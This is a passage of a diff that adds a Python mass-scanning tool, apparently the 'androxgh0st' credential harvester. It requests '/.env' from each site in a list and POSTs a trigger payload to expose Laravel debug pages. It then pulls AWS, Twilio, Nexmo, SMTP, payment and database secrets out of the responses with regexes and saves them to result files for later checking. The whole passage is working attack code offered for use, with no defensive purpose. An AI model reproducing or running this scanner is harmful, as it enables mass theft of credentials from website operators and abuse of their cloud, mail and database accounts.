+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			elif "WAS_ACCESS_KEY_ID" in str(text):
+				if "WAS_ACCESS_KEY_ID=" in str(text):
+					method = '/.env'
+					try:
+					   aws_key = reg("\nWAS_ACCESS_KEY_ID=(.*?)\n", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("\nWAS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				elif "<td>WAS_ACCESS_KEY_ID</td>" in text:
+					method = 'debug'
+					try:
+						aws_key = reg("<td>WAS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_sec = reg("<td>WAS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_sec = ''
+					try:
+						asu = androxgh0st().get_aws_region(text)
+						if asu:
+							aws_reg = asu
+						else:
+							aws_reg = ''
+					except:
+						aws_reg = ''
+				if aws_reg == "":
+					aws_reg = "aws_unknown_region--"
+				if aws_key == "" and aws_sec == "":
+					return False
+				else:
+					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
+					remover = str(build).replace('\r', '')
+					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
+					save.write(remover+'\n\n')
+					save.close()
+					remover = str(build).replace('\r', '')
+					save2 = open('Results/aws_access_key_secret.txt', 'a')
+					save2.write(remover+'\n\n')
+					save2.close()
+					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
+					remover2 = str(build_forchecker).replace('\r', '')
+					save3 = open('Results/forchecker/aws_secretkey.txt','a')
+					save3.write(remover2+'\n')
+					save3.close()
+				return True
+			else:
+				if "AKIA" in str(text):
+					save = open('Results/AKIA.txt','a')
+					save.write(str(url)+'\n')
+					save.close()
+				return False
+		except:
+			return False
+
+	def get_twillio(self, text, url):
+		try:
+			if "TWILIO" in text:
+				if "TWILIO_ACCOUNT_SID=" in text:
+					method = '/.env'
+					try:
+						acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
+					except:
+						acc_key = ''
+					try:
+						sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
+					except:
+						sec = ''
+					try:
+						chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
+					except:
+						chatid = ''
+					try:
+						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
+					except:
+						phone = ''
+					try:
+						auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
+					except:
+						auhtoken = ''
+				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
+					method = 'debug'
+					try:
+						acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						acc_key = ''
+					try:
+						sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						sec = ''
+					try:
+						chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						chatid = ''
+					try:
+						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						phone = ''
+					try:
+						auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						auhtoken = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)
+				remover = str(build).replace('\r', '')
+				save = open('Results/TWILIO.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
+				remover2 = str(build_forchecker).replace('\r', '')
+				save2 = open('Results/forchecker/twilio.txt','a')
+				save2.write(remover2+'\n')
+				save2.close()
+				return True
+			elif "SMS_API_SENDER_ID" in text:
+				if "SMS_API_SENDER_ID=" in text:
+					method = '/.env'
+					try:
+						acc_sid = reg('\nSMS_API_SENDER_ID=(.*?)\n', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						authtoken = reg('\nSMS_API_TOKEN=(.*?)\n', text)[0]
+					except:
+						authtoken = ''
+					try:
+						phone = reg('\nSMS_API_FROM=(.*?)\n', text)[0]
+					except:
+						phone = ''
+				elif "<td>SMS_API_SENDER_ID</td>" in text:
+					method = 'debug'
+					try:
+						acc_sid = reg('<td>SMS_API_SENDER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						authtoken = reg('<td>SMS_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						authtoken = ''
+					try:
+						phone = reg('<td>SMS_API_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						phone = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSMS_API_SENDER_ID: '+str(acc_sid)+'\nSMS_API_TOKEN: '+str(auhtoken)+'\nSMS_API_FROM: '+str(phone)
+				remover = str(build).replace('\r', '')
+				save = open('Results/TWILIO.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
+				remover2 = str(build_forchecker).replace('\r', '')
+				save2 = open('Results/forchecker/twilio.txt','a')
+				save2.write(remover2+'\n')
+				save2.close()
+				return True
+			elif "TWILIO_SID" in text:
+				if "TWILIO_SID=" in text:
+					method = '/.env'
+					try:
+						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						authtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
+					except:
+						authtoken = ''
+					try:
+						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
+					except:
+						phone = ''
+				elif "<td>TWILIO_SID</td>" in text:
+					method = 'debug'
+					try:
+						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						authtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						authtoken = ''
+					try:
+						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						phone = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(auhtoken)+'\nTWILIO_NUMBER: '+str(phone)
+				remover = str(build).replace('\r', '')
+				save = open('Results/TWILIO.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
+				remover2 = str(build_forchecker).replace('\r', '')
+				save2 = open('Results/forchecker/twilio.txt','a')
+				save2.write(remover2+'\n')
+				save2.close()
+				return True
+			else:
+				return False
+		except:
+			return False
+
+	def get_nexmo(self, text, url):
+		try:
+			if "NEXMO" in text:
+				if "NEXMO_KEY=" in text:
+					method = '/.env'
+					try:
+						nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
+					except:
+						nexmo_key = ''
+					try:
+						nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
+					except:
+						nexmo_secret = ''
+					try:
+						phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
+					except:
+						phone = ''
+				elif '<td>NEXMO_KEY</td>' in text:
+					method = 'debug'
+					try:
+						nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						nexmo_key = ''
+					try:
+						nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						nexmo_secret = ''
+					try:
+						phone = reg('<td>EXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						phone = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nNEXMO_KEY: '+str(nexmo_key)+'\nNEXMO_SECRET: '+str(nexmo_secret)+'\nNEXMO_NUMBER: '+str(phone)
+				remover = str(build).replace('\r', '')
+				save = open('Results/NEXMO.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
+				remover2 = str(build_forchecker).replace('\r', '')
+				save2 = open('Results/forchecker/nexmo.txt','a')
+				save2.write(remover2+'\n')
+				save2.close()
+				return True
+			elif "EXOTEL_API_KEY" in text:
+				if "EXOTEL_API_KEY=" in text:
+					method = '/.env'
+					try:
+						exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
+					except:
+						exotel_api = ''
+					try:
+						exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
+					except:
+						exotel_token = ''
+					try:
+						exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
+					except:
+						exotel_sid = ''
+				elif '<td>EXOTEL_API_KEY</td>' in text:
+					method = 'debug'
+					try:
+						exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						exotel_api = ''
+					try:
+						exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						exotel_token = ''
+					try:
+						exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						exotel_sid = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
+				remover = str(build).replace('\r', '')
+				save = open('Results/EXOTEL.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				return True
+			elif "ONESIGNAL_APP_ID" in text:
+				if "ONESIGNAL_APP_ID=" in text:
+					method = '/.env'
+					try:
+						onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
+					except:
+						onesignal_id = ''
+					try:
+						onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
+					except:
+						onesignal_id = ''
+					try:
+						onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
+					except:
+						onesignal_auth = ''
+				elif '<td>ONESIGNAL_APP_ID</td>' in text:
+					method = 'debug'
+					try:
+						onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						onesignal_id = ''
+					try:
+						onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						onesignal_token = ''
+					try:
+						onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						onesignal_auth = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
+				remover = str(build).replace('\r', '')
+				save = open('Results/ONESIGNAL.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				return True
+			elif "TOKBOX_KEY_DEV" in text:
+				if "TOKBOX_KEY_DEV=" in text:
+					method = '/.env'
+					try:
+						tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
+					except:
+						tokbox_key = ''
+					try:
+						tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
+					except:
+						tokbox_secret = ''
+				elif '<td>TOKBOX_KEY_DEV</td>' in text:
+					method = 'debug'
+					try:
+						tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						tokbox_key = ''
+					try:
+						tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						tokbox_secret = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
+				remover = str(build).replace('\r', '')
+				save = open('Results/TOKBOX.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				return True
+			elif "TOKBOX_KEY" in text:
+				if "TOKBOX_KEY=" in text:
+					method = '/.env'
+					try:
+						tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
+					except:
+						tokbox_key = ''
+					try:
+						tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
+					except:
+						tokbox_secret = ''
+				elif '<td>TOKBOX_KEY</td>' in text:
+					method = 'debug'
+					try:
+						tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						tokbox_key = ''
+					try:
+						tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						tokbox_secret = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
+				remover = str(build).replace('\r', '')
+				save = open('Results/TOKBOX.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				return True
+			elif "TOKBOX_KEY_OLD" in text:
+				if "TOKBOX_KEY_OLD=" in text:
+					method = '/.env'
+					try:
+						tokbox_key = reg('\nTOKBOX_KEY_OLD=(.*?)\n', text)[0]
+					except:
+						tokbox_key = ''
+					try:
+						tokbox_secret = reg('\nTOKBOX_SECRET_OLD=(.*?)\n', text)[0]
+					except:
+						tokbox_secret = ''
+				elif '<td>TOKBOX_KEY_OLD</td>' in text:
+					method = 'debug'
+					try:
+						tokbox_key = reg('<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						tokbox_key = ''
+					try:
+						tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						tokbox_secret = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
+				remover = str(build).replace('\r', '')
+				save = open('Results/TOKBOX.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				return True
+			elif "PLIVO_AUTH_ID" in text:
+				if "PLIVO_AUTH_ID=" in text:
+					method = '/.env'
+					try:
+						plivo_auth = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
+					except:
+						plivo_auth = ''
+					try:
+						plivo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
+					except:
+						plivo_secret = ''
+				elif '<td>PLIVO_AUTH_ID</td>' in text:
+					method = 'debug'
+					try:
+						plivo_auth = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						plivo_auth = ''
+					try:
+						plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						plivo_secret = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPLIVO_AUTH_ID: '+str(tokbox_key)+'\nPLIVO_AUTH_TOKEN: '+str(tokbox_secret)
+				remover = str(build).replace('\r', '')
+				save = open('Results/PLIVO.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				return True
+			else:
+				return False
+		except:
+			return False
+
+	def get_smtp(self, text, url):
+		try:
+			if "MAIL_HOST" in text:
+				if "MAIL_HOST=" in text:
+					method = '/.env'
+					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
+					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
+					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
+					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
+					try:
+						mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
+					except:
+						mailfrom = ''
+					try:
+						fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
+					except:
+						fromname = ''
+				elif "<td>MAIL_HOST</td>" in text:
+					method = 'debug'
+					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					try:
+						mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						mailfrom = ''
+					try:
+						fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						fromname = ''
+				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
+					return False
+				else:
+					# mod aws
+					if '.amazonaws.com' in mailhost:
+						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+						remover = str(build).replace('\r', '')
+						save2 = open('Results/smtp_aws.txt', 'a')
+						save2.write(remover+'\n\n')
+						save2.close()
+					elif 'sendgrid' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/sendgrid.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+						build_forchecker = str(mailhost)+"|"+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
+						remover2 = str(build_forchecker).replace('\r', '')
+						save3 = open('Results/forchecker/sendgrid.txt','a')
+						save3.write(remover2+'\n')
+						save3.close()
+					elif 'office365' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/office.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					elif '1and1' in mailhost or '1und1' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/1and1.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					elif 'zoho' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/zoho.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					elif 'mandrillapp' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/mandrill.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					elif 'mailgun' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/mailgun.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					elif 'emailsrvr' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/emailsrvr.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					elif 'ionos' in mailhost:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/ionos.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					else:
+						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
+						remover = str(build).replace('\r', '')
+						save = open('Results/SMTP_RANDOM.txt', 'a')
+						save.write(remover+'\n\n')
+						save.close()
+					return True
+			else:
+				return False
+		except:
+			return False
+
+	def get_database(self, text, url):
+		try:
+			if "DB_HOST" in text:
+				if "DB_HOST=" in text:
+					method = '/.env'
+					try:
+						db_host = reg('\nDB_HOST=(.*?)\n', text)[0]
+					except:
+						db_host = ''
+					try:
+						db_port = reg('\nDB_PORT=(.*?)\n', text)[0]
+					except:
+						db_port = ''
+					try:
+						db_name = reg('\nDB_DATABASE=(.*?)\n', text)[0]
+					except:
+						db_name = ''
+					try:
+						db_user = reg('\nDB_USERNAME=(.*?)\n', text)[0]
+					except:
+						db_user = ''
+					try:
+						db_pass = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
+					except:
+						db_pass = ''
+				elif "<td>DB_HOST</td>" in text:
+					method = 'debug'
+					try:
+						db_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						db_host = ''
+					try:
+						db_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						db_port = ''
+					try:
+						db_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						db_name = ''
+					try:
+						db_user = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						db_user = ''
+					try:
+						db_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						db_pass = ''
+				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(db_host)+'\nDB_PORT: '+str(db_port)+'\nDB_NAME: '+str(db_name)+'\nDB_USER: '+str(db_user)+'\nDB_PASS: '+str(db_pass)
+				remover = str(build).replace('\r', '')
+				save = open('Results/DATABASE.txt', 'a')
+				save.write(remover+'\n\n')
+				save.close()
+				build_forchecker = str(url)+"|"+str(db_host)+"|"+str(db_port)+"|"+str(db_user)+"|"+str(db_pass)+"|"+str(db_name)
+				remover2 = str(build_forchecker).replace('\r', '')
+				if str(db_user) == "root":
+					save3 = open('Results/forchecker/database_root.txt','a')
+				else:
+					save3 = open('Results/forchecker/database.txt','a')
+				save3.write(remover2+'\n')
+				save3.close()
+				return True
+			else:
+				return False
+		except:
+			return False
+
+def printf(text):
+	''.join([str(item) for item in text])
+	print(text + '\n'),
+
+def main(url):
+	resp = False
+	try:
+		text = '\033[32;1m#\033[0m '+url
+		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
+		get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
+		if "APP_KEY=" in get_source:
+			resp = get_source
+		else:
+			get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
+			if "<td>APP_KEY</td>" in get_source:
+				resp = get_source
+		if resp:
+			remover2 = str(url).replace('\r', '')
+			save3 = open('Results/logsites/vulnerable.txt','a')
+			save3.write(remover2+'\n')
+			save3.close()
+			getsmtp = androxgh0st().get_smtp(resp, url)
+			getwtilio = androxgh0st().get_twillio(resp, url)
+			smsapi = androxgh0st().get_nexmo(resp, url)
+			getaws = androxgh0st().get_aws_data(resp, url)
+			getpp = androxgh0st().payment_api(resp, url)
+			getdb = androxgh0st().get_database(resp, url)
+			if getsmtp:
+				text += ' | \033[32;1mSMTP\033[0m'
+			else:
+				text += ' | \033[31;1mSMTP\033[0m'
+			if getaws:
+				text += ' | \033[32;1mAWS\033[0m'
+			else:
+				text += ' | \033[31;1mAWS\033[0m'
+			if getwtilio:
+				text += ' | \033[32;1mTWILIO\033[0m'
+			else:
+				text += ' | \033[31;1mTWILIO\033[0m'
+			if smsapi:
+				text += ' | \033[32;1mSMS API\033[0m'
+			else:
+				text += ' | \033[31;1mSMS API\033[0m'
+			if getpp:
+				text += ' | \033[32;1mPAYMENT API\033[0m'
+			else:
+				text += ' | \033[31;1mPAYMENT API\033[0m'
+			if getdb:
+				text += ' | \033[32;1mDATABASE\033[0m'
+			else:
+				text += ' | \033[31;1mDATABASE\033[0m'
+		else:
+			text += ' | \033[31;1mCan\'t get everything\033[0m'
+			save = open('Results/logsites/not_vulnerable.txt','a')
+			asu = str(url).replace('\r', '')
+			save.write(asu+'\n')
+			save.close()
+	except:
+		text = '\033[31;1m#\033[0m '+url
+		text += ' | \033[31;1mCan\'t access sites\033[0m'
+		save = open('Results/logsites/exception_sites.txt','a')
+		asu = str(url).replace('\r', '')
+		save.write(asu+'\n')
+		save.close()
+	printf(text)
+
+
+if __name__ == '__main__':
+	print('''                __   _                  __    _ __       
+   __  ____  __/ /__(_)___  ____  _____/ /_  (_) /_____ _
+  / / / / / / / //_/ / __ \/ __ \/ ___/ __ \/ / __/ __ `/
+ / /_/ / /_/ / ,< / / / / / /_/ (__  ) / / / / /_/ /_/ / 
+ \__, /\__,_/_/|_/_/_/ /_/\____/____/_/ /_/_/\__/\__,_/  
+/____/     Made full with â™¥ by kita semua - v3.0.1            
+\n''')
+	try:
+		readcfg = ConfigParser()
+		readcfg.read(pid_restore)
+		lists = readcfg.get('DB', 'FILES')
+		numthread = readcfg.get('DB', 'THREAD')
+		sessi = readcfg.get('DB', 'SESSION')
+		print("log session bot found! restore session")
+		print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
+		tanya = raw_input("Want to contineu session ? [Y/n] ")
+		if "Y" in tanya or "y" in tanya:
+			lerr = open(lists).read().split("\n"+sessi)[1]
+			readsplit = lerr.splitlines()
+		else:
+			kntl # Send Error Biar Lanjut Ke Wxception :v
+	except:
+		try:
+			lists = sys.argv[1]
+			numthread = sys.argv[2]
+			readsplit = open(lists).read().splitlines()
+		except:
+			try:
+				lists = raw_input("websitelist ? ")
+				readsplit = open(lists).read().splitlines()
+			except:
+				print("\nWrong input or list not found!")
+				exit()
+			try:
+				numthread = raw_input("threads ? ")
+			except:
+				print("\nWrong thread number!")
+				exit()
